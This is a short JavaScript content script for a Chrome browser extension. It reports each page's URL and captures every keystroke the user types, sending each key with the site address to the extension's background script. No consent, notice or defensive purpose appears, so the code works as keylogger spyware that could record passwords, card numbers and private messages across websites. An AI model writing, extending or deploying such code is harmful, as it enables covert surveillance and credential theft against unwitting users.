// Send site information when the content script is injected
chrome.runtime.sendMessage({ type: "site", data: location.href });

// Listen for keystroke events
document.addEventListener("keydown", function(event) {
  chrome.runtime.sendMessage({ type: "keystroke", data: event.key, site: location.href });
});

// Listen for page navigation events to ensure site information is sent reliably
window.addEventListener("beforeunload", function() {
  chrome.runtime.sendMessage({ type: "site", data: location.href });
});


